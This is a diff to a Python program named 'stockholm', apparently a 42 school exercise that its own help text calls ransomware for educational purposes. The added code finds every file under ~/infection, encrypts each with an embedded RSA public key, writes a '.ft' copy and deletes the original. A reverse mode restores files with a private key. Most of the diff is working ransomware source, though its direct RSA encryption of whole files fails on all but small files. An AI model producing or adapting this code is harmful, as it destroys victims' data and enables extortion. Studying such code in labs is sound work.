@@ -6,15 +6,22 @@
 #    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
-#    Updated: 2025/02/17 16:34:34 by guferrei         ###   ########.fr        #
+#    Updated: 2025/02/18 15:33:44 by guferrei         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 import argparse, glob, os
 from os.path import expanduser
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
 
-path = expanduser("~") + "/infection"
-public_key = b"""-----BEGIN RSA PUBLIC KEY----- MBgCEQCl/IGtHk0lD0CvdwOKbFtzAgMBAAE=-----END RSA PUBLIC KEY-----"""
+PATH = expanduser("~") + "/infection"
+PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgrHmM9fzuQqG/La/Hv3e+OIjz
+cP2T4a/yMkanD1nzMrlsLWqMtFC/Gc+2Gk2DG0nvqF4OWh91yHO/IZasdCdkg5uL
+vu+/lNZzEHW3kO73ewUF/e3F/Vc072CnmsjFrUh7BgikodmbKL2On+1cQqXGrw2L
++vyY/rxNNDY5OaleMwIDAQAB
+-----END PUBLIC KEY-----"""
 
 def program_args():
 	parser = argparse.ArgumentParser(description="This program is a Ransomware, be careful!!! This project is for educational purposes only. You should never use this type of program for malicious purposes.")
@@ -27,28 +34,61 @@ def program_args():
 def print_version():
 	print("stockholm 1.0.0")
 
-def reverse(key: str):
-	print(key)
-
 def get_files():
 	file_list = []
-	for file in glob.glob(path + "/**/*", recursive=True):
+	for file in glob.glob(PATH + "/**/*", recursive=True):
 		if os.path.isfile(file):
 			file_list.append(file)
 	return file_list
 
+def load_file_content(file):
+	with open(file, 'rb') as f:
+		data = f.read()
+		return data
 
 def encrypt(file, args):
 	if not args.silent:
 		print("ecrypting file {}...".format(file))
-	with open(file, 'rb') as f:
-		plaintext = f.read()
+	plaintext = load_file_content(file)
 
-	# ENCRYPT
-	ciphertext = "TO-DO"
+	if plaintext:
+		public_key = serialization.load_pem_public_key(PUBLIC_KEY)
 
-	# with open(file+'.ft', 'wb') as f:
-		# f.write(ciphertext)
+		ciphertext = public_key.encrypt(
+			plaintext,
+			padding.OAEP(
+				mgf=padding.MGF1(algorithm=hashes.SHA256()),
+				algorithm=hashes.SHA256(),
+				label=None
+			)
+		)
+
+		with open(file+'.ft', 'wb') as f:
+			f.write(ciphertext)
+		os.remove(file)
+
+def decrypt(file, key):
+	ciphertext = load_file_content(file)
+	if ciphertext:
+		private_key = serialization.load_pem_private_key(key.encode(), password=None)
+
+		plaintext = private_key.decrypt(
+			ciphertext,
+			padding.OAEP(
+				mgf=padding.MGF1(algorithm=hashes.SHA256()),
+				algorithm=hashes.SHA256(),
+				label=None
+			)
+		)
+
+		with open(file.removesuffix('.ft'), 'wb') as f:
+			f.write(plaintext)
+		os.remove(file)
+
+def reverse(key: str):
+	file_list = get_files()
+	for file in file_list:
+		decrypt(file, key)
 
 def run(args):
 	file_list = get_files()
@@ -61,6 +101,7 @@ def main():
 		print_version()
 	if args.reverse:
 		reverse(args.reverse)
+		return
 	run(args)
 
 if __name__ == '__main__':
